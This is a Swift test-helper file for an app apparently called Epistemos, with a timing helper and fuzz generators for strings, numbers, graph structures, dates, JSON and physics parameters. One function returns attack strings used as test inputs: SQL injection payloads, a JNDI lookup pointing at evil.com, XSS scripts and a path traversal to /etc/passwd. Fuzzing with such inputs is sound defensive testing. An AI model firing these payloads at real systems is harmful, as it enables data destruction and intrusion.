import Foundation
@testable import Epistemos

// MARK: - Performance Measurement Helper
// Swift Testing has no built-in `measure {}`. This provides an equivalent.

@discardableResult
func measure(iterations: Int = 1, _ body: () throws -> Void) rethrows -> Duration {
    let clock = ContinuousClock()
    var best: Duration = .seconds(999)
    for _ in 0..<iterations {
        let elapsed = try clock.measure { try body() }
        if elapsed < best { best = elapsed }
    }
    return best
}

@discardableResult
func measure(iterations: Int = 1, _ body: () async throws -> Void) async rethrows -> Duration {
    let clock = ContinuousClock()
    var best: Duration = .seconds(999)
    for _ in 0..<iterations {
        let elapsed = try await clock.measure { try await body() }
        if elapsed < best { best = elapsed }
    }
    return best
}

// MARK: - Fuzz Data Generators
// Reusable fuzzing utilities for generating test data.

// MARK: String Fuzz Generators

enum StringFuzz {
    
    /// Generates a random string of specified length
    static func randomString(length: Int, from charset: String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") -> String {
        String((0..<length).map { _ in charset.randomElement()! })
    }
    
    /// Generates a string with random Unicode characters
    static func randomUnicode(length: Int) -> String {
        let scalars = (0..<length).compactMap { _ -> Unicode.Scalar? in
            let value = UInt32.random(in: 0...0x10FFFF)
            // Skip surrogates and invalid values
            guard value < 0xD800 || value > 0xDFFF else { return nil }
            return Unicode.Scalar(value)
        }
        return String(String.UnicodeScalarView(scalars))
    }
    
    /// Generates a string with emoji
    static func emojiString(length: Int) -> String {
        let emojis = ["😀", "🎉", "🚀", "💡", "🔥", "⭐", "❤️", "👍", "🤔", "✨",
                      "👨‍👩‍👧‍👦", "🏳️‍🌈", "🧑‍🚀", "🌍", "🎨", "🎵", "📚", "💻", "🔬", "🎯"]
        return (0..<length).map { _ in emojis.randomElement()! }.joined()
    }
    
    /// Generates RTL text
    static func rtlString() -> String {
        let words = ["مرحبا", "بالعالم", "שלום", "עולם", "سلام", "خوش"]
        return words.shuffled().joined(separator: " ")
    }
    
    /// Generates a string with combining marks
    static func combiningMarksString(base: String = " cafe ") -> String {
        base + "\u{0301}" // Combining acute accent
    }
    
    /// Generates SQL injection patterns
    static func sqlInjectionPatterns() -> [String] {
        [
            "'; DROP TABLE nodes; --",
            "1' OR '1'='1",
            "'; DELETE FROM nodes; --",
            "' UNION SELECT * FROM passwords --",
            "${jndi:ldap://evil.com}",
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "'; EXEC sp_msforeachtable 'DROP TABLE ?'; --",
            "../../etc/passwd",
            "%00",
            "\\x00",
            "\\",
            "\\\\"
        ]
    }
    
    /// Generates regex special characters
    static func regexSpecialChars() -> [String] {
        [".", "*", "+", "?", "^", "$", "(", ")", "[", "]", "{", "}", "|", "\\"]
    }
    
    /// Generates control characters
    static func controlChars() -> [String] {
        ["\0", "\n", "\r", "\t", "\u{0001}", "\u{001F}", "\u{007F}", "\u{009F}"]
    }
    
    /// Generates very long string
    static func veryLongString(length: Int) -> String {
        randomString(length: length)
    }
    
    /// Generates whitespace variations
    static func whitespaceVariations() -> [String] {
        [" ", "\t", "\n", "\r", "\r\n", "   ", "\t\t\t", " \t\n \t\n"]
    }
}

// MARK: Numeric Fuzz Generators

enum NumericFuzz {
    
    /// Generates random float at various scales
    static func randomFloat(scale: FloatScale = .normal) -> Float {
        switch scale {
        case .tiny:
            return Float.random(in: 0...Float.leastNormalMagnitude)
        case .small:
            return Float.random(in: -1...1)
        case .normal:
            return Float.random(in: -1000...1000)
        case .large:
            return Float.random(in: -Float.greatestFiniteMagnitude/2...Float.greatestFiniteMagnitude/2)
        case .extreme:
            return Bool.random() ? Float.greatestFiniteMagnitude : -Float.greatestFiniteMagnitude
        }
    }
    
    /// Generates special floating point values
    static func specialFloats() -> [Float] {
        [
            0,
            -0,
            Float.infinity,
            -Float.infinity,
            Float.nan,
            Float.leastNormalMagnitude,
            Float.leastNonzeroMagnitude,
            Float.greatestFiniteMagnitude,
            Float.pi,
            Float.ulpOfOne
        ]
    }
    
    /// Generates special double values
    static func specialDoubles() -> [Double] {
        [
            0,
            -0,
            Double.infinity,
            -Double.infinity,
            Double.nan,
            Double.leastNormalMagnitude,
            Double.leastNonzeroMagnitude,
            Double.greatestFiniteMagnitude,
            Double.pi,
            Double.ulpOfOne
        ]
    }
    
    /// Generates edge case integers
    static func edgeCaseIntegers() -> [Int] {
        [
            0,
            -1,
            1,
            Int.min,
            Int.max,
            Int.min + 1,
            Int.max - 1,
            Int.min / 2,
            Int.max / 2
        ]
    }
    
    enum FloatScale {
        case tiny, small, normal, large, extreme
    }
}

// MARK: Graph Fuzz Generators

enum GraphFuzz {
    
    /// Generates a random node
    static func randomNode(id: String? = nil) -> GraphNodeRecord {
        let nodeId = id ?? UUID().uuidString
        let types = GraphNodeType.allCases
        
        return GraphNodeRecord(
            id: nodeId,
            type: types.randomElement()!,
            label: StringFuzz.randomString(length: Int.random(in: 1...100)),
            sourceId: Bool.random() ? UUID().uuidString : nil,
            metadata: randomMetadata(),
            weight: Double(NumericFuzz.randomFloat()),
            createdAt: randomDate(),
            position: randomPosition(),
            velocity: randomVelocity()
        )
    }
    
    /// Generates a random edge
    static func randomEdge(source: String, target: String, id: String? = nil) -> GraphEdgeRecord {
        let types: [GraphEdgeType] = [.reference, .contains, .tagged, .mentions, .cites,
                                       .authored, .related, .quotes, .supports, .contradicts,
                                       .expands, .questions]
        
        return GraphEdgeRecord(
            id: id ?? UUID().uuidString,
            sourceNodeId: source,
            targetNodeId: target,
            type: types.randomElement()!,
            weight: Double(NumericFuzz.randomFloat()),
            createdAt: randomDate()
        )
    }
    
    /// Generates a random graph topology
    static func randomGraph(nodeCount: Int, edgeProbability: Double = 0.1) -> (nodes: [GraphNodeRecord], edges: [GraphEdgeRecord]) {
        var nodes: [GraphNodeRecord] = []
        var edges: [GraphEdgeRecord] = []
        
        // Generate nodes
        for i in 0..<nodeCount {
            nodes.append(randomNode(id: "node-\(i)"))
        }
        
        // Generate edges randomly
        for i in 0..<nodeCount {
            for j in (i+1)..<nodeCount {
                if Double.random(in: 0...1) < edgeProbability {
                    edges.append(randomEdge(source: "node-\(i)", target: "node-\(j)"))
                }
            }
        }
        
        return (nodes, edges)
    }
    
    /// Generates a complete graph
    static func completeGraph(n: Int) -> (nodes: [GraphNodeRecord], edges: [GraphEdgeRecord]) {
        var nodes: [GraphNodeRecord] = []
        var edges: [GraphEdgeRecord] = []
        
        for i in 0..<n {
            nodes.append(randomNode(id: "node-\(i)"))
        }
        
        for i in 0..<n {
            for j in (i+1)..<n {
                edges.append(randomEdge(source: "node-\(i)", target: "node-\(j)"))
            }
        }
        
        return (nodes, edges)
    }
    
    /// Generates a star graph
    static func starGraph(spokes: Int) -> (nodes: [GraphNodeRecord], edges: [GraphEdgeRecord]) {
        var nodes: [GraphNodeRecord] = []
        var edges: [GraphEdgeRecord] = []
        
        let center = randomNode(id: "center")
        nodes.append(center)
        
        for i in 0..<spokes {
            nodes.append(randomNode(id: "spoke-\(i)"))
            edges.append(randomEdge(source: "center", target: "spoke-\(i)"))
        }
        
        return (nodes, edges)
    }
    
    /// Generates a chain/line graph
    static func chainGraph(length: Int) -> (nodes: [GraphNodeRecord], edges: [GraphEdgeRecord]) {
        var nodes: [GraphNodeRecord] = []
        var edges: [GraphEdgeRecord] = []
        
        for i in 0..<length {
            nodes.append(randomNode(id: "node-\(i)"))
            if i > 0 {
                edges.append(randomEdge(source: "node-\(i-1)", target: "node-\(i)"))
            }
        }
        
        return (nodes, edges)
    }
    
    /// Generates a cycle graph
    static func cycleGraph(n: Int) -> (nodes: [GraphNodeRecord], edges: [GraphEdgeRecord]) {
        var nodes: [GraphNodeRecord] = []
        var edges: [GraphEdgeRecord] = []
        
        for i in 0..<n {
            nodes.append(randomNode(id: "node-\(i)"))
        }
        
        for i in 0..<n {
            let next = (i + 1) % n
            edges.append(randomEdge(source: "node-\(i)", target: "node-\(next)"))
        }
        
        return (nodes, edges)
    }
    
    /// Generates a binary tree
    static func binaryTree(depth: Int) -> (nodes: [GraphNodeRecord], edges: [GraphEdgeRecord]) {
        var nodes: [GraphNodeRecord] = []
        var edges: [GraphEdgeRecord] = []
        
        func addNode(_ id: String) {
            nodes.append(randomNode(id: id))
        }
        
        func buildTree(_ nodeId: String, currentDepth: Int) {
            if currentDepth >= depth { return }
            
            let leftChild = "\(nodeId)-L"
            let rightChild = "\(nodeId)-R"
            
            addNode(leftChild)
            addNode(rightChild)
            
            edges.append(randomEdge(source: nodeId, target: leftChild))
            edges.append(randomEdge(source: nodeId, target: rightChild))
            
            buildTree(leftChild, currentDepth: currentDepth + 1)
            buildTree(rightChild, currentDepth: currentDepth + 1)
        }
        
        addNode("root")
        buildTree("root", currentDepth: 0)
        
        return (nodes, edges)
    }
    
    // MARK: - Private Helpers
    
    private static func randomMetadata() -> GraphNodeMetadata {
        var meta = GraphNodeMetadata()
        
        if Bool.random() {
            meta.evidenceGrade = ["A", "B", "C", "D"].randomElement()
        }
        if Bool.random() {
            meta.researchStage = Int.random(in: 0...5)
        }
        if Bool.random() {
            meta.url = "https://example.com/\(UUID().uuidString)"
        }
        if Bool.random() {
            meta.authors = (0..<Int.random(in: 1...5)).map { _ in StringFuzz.randomString(length: 10) }
        }
        if Bool.random() {
            meta.year = Int.random(in: 1900...2030)
        }
        
        return meta
    }
    
    private static func randomDate() -> Date {
        let interval = TimeInterval.random(in: -1_000_000_000...1_000_000_000)
        return Date(timeIntervalSince1970: interval)
    }
    
    private static func randomPosition() -> SIMD2<Float> {
        SIMD2<Float>(
            NumericFuzz.randomFloat(scale: .large),
            NumericFuzz.randomFloat(scale: .large)
        )
    }
    
    private static func randomVelocity() -> SIMD2<Float> {
        SIMD2<Float>(
            NumericFuzz.randomFloat(),
            NumericFuzz.randomFloat()
        )
    }
}

// MARK: Search Query Fuzz Generators

enum SearchFuzz {
    
    /// Generates random search queries
    static func randomQueries(count: Int) -> [String] {
        (0..<count).map { _ in randomQuery() }
    }
    
    /// Generates a single random search query
    static func randomQuery() -> String {
        let types: [SearchQueryType] = [.empty, .singleChar, .normal, .long, .special, .unicode]
        
        switch types.randomElement()! {
        case .empty:
            return ""
        case .singleChar:
            return String("abcdefghijklmnopqrstuvwxyz".randomElement()!)
        case .normal:
            return StringFuzz.randomString(length: Int.random(in: 3...10))
        case .long:
            return StringFuzz.randomString(length: Int.random(in: 100...1000))
        case .special:
            return StringFuzz.regexSpecialChars().randomElement()!
        case .unicode:
            return StringFuzz.randomUnicode(length: Int.random(in: 1...10))
        }
    }
    
    /// Generates edge case search queries
    static func edgeCaseQueries() -> [String] {
        [
            "",
            "a",
            " ",
            "  ",
            "\t",
            "\n",
            "*",
            "?",
            "%",
            "_",
            "'",
            "\"",
            ";",
            "--",
            "/*",
            "*/",
            String(repeating: "a", count: 10000),
            StringFuzz.emojiString(length: 10),
            StringFuzz.rtlString(),
        ]
    }
    
    enum SearchQueryType {
        case empty, singleChar, normal, long, special, unicode
    }
}

// MARK: Date Fuzz Generators

enum DateFuzz {
    
    /// Generates random dates
    static func randomDates(count: Int) -> [Date] {
        (0..<count).map { _ in randomDate() }
    }
    
    /// Generates a random date
    static func randomDate() -> Date {
        let intervals: [TimeInterval] = [
            -1_000_000_000, // Distant past
            -1_000_000,     // 1970-ish
            0,              // Epoch
            1_000_000,      // 1970-ish future
            1_000_000_000,  // Distant future
            Date.distantPast.timeIntervalSince1970,
            Date.distantFuture.timeIntervalSince1970,
            Date.now.timeIntervalSince1970
        ]
        
        return Date(timeIntervalSince1970: intervals.randomElement()!)
    }
    
    /// Generates edge case dates
    static func edgeCaseDates() -> [Date] {
        [
            Date.distantPast,
            Date.distantFuture,
            Date(timeIntervalSince1970: 0),
            Date(timeIntervalSince1970: -1),
            Date(timeIntervalSince1970: 1),
            Date(timeIntervalSince1970: TimeInterval(Int.max)),
            Date(timeIntervalSince1970: TimeInterval(Int.min))
        ]
    }
}

// MARK: JSON Fuzz Generators

enum JSONFuzz {
    
    /// Generates corrupted JSON strings
    static func corruptedJSON() -> [Data] {
        [
            Data("{".utf8),                           // Truncated object
            Data("}".utf8),                           // Lone closing brace
            Data("{invalid}".utf8),                   // Invalid syntax
            Data("{\"key\": }".utf8),                  // Missing value
            Data("{\"key\": undefined}".utf8),        // Undefined value
            Data("{\"key\": [}".utf8),                 // Unclosed array
            Data("{\"key\": \"\u{0000}\"}".utf8),       // Null byte in string
            Data("\u{0000}".utf8),                     // Just null byte
            Data(String(repeating: "{", count: 1000).utf8), // Deep nesting start
            Data("}".utf8),                           // Deep nesting end
            Data("{}".utf8),                          // Empty object
            Data("[]".utf8),                          // Empty array
            Data("null".utf8),                        // Just null
            Data("true".utf8),                        // Just true
            Data("false".utf8),                       // Just false
            Data("123".utf8),                         // Just number
            Data("\"string\"".utf8),                  // Just string
        ]
    }
    
    /// Generates valid but unusual JSON
    static func unusualJSON() -> [Data] {
        [
            Data("{}".utf8),
            Data("[]".utf8),
            Data("{\"a\": null}".utf8),
            Data("{\"a\": true, \"b\": false}".utf8),
            Data("{\"a\": 0, \"b\": -0, \"c\": 0.0}".utf8),
            Data("{\"a\": \"\", \"b\": \" \"}".utf8),
            Data("{\"a\": [], \"b\": {}}".utf8),
            Data("{\"\": \"empty key\"}".utf8),
        ]
    }
}

// MARK: Physics Parameter Fuzz

enum PhysicsFuzz {
    
    /// Generates random physics parameters
    static func randomParameters() -> PhysicsParams {
        PhysicsParams(
            linkDistance: NumericFuzz.randomFloat(scale: .normal),
            chargeStrength: -abs(NumericFuzz.randomFloat(scale: .large)),
            chargeRange: abs(NumericFuzz.randomFloat(scale: .large)),
            linkStrength: NumericFuzz.randomFloat(scale: .small),
            velocityDecay: NumericFuzz.randomFloat(scale: .small),
            centerStrength: abs(NumericFuzz.randomFloat(scale: .small)),
            collisionRadius: abs(NumericFuzz.randomFloat(scale: .normal))
        )
    }
    
    /// Generates extreme physics parameters
    static func extremeParameters() -> [PhysicsParams] {
        [
            PhysicsParams(linkDistance: 0, chargeStrength: 0, chargeRange: 0, 
                         linkStrength: 0, velocityDecay: 0, centerStrength: 0, collisionRadius: 0),
            PhysicsParams(linkDistance: Float.greatestFiniteMagnitude, chargeStrength: -Float.greatestFiniteMagnitude,
                         chargeRange: Float.greatestFiniteMagnitude, linkStrength: Float.greatestFiniteMagnitude,
                         velocityDecay: 1, centerStrength: Float.greatestFiniteMagnitude,
                         collisionRadius: Float.greatestFiniteMagnitude),
            PhysicsParams(linkDistance: -1, chargeStrength: 1, chargeRange: -1,
                         linkStrength: -1, velocityDecay: -1, centerStrength: -1, collisionRadius: -1),
        ]
    }
    
    struct PhysicsParams {
        let linkDistance: Float
        let chargeStrength: Float
        let chargeRange: Float
        let linkStrength: Float
        let velocityDecay: Float
        let centerStrength: Float
        let collisionRadius: Float
    }
}
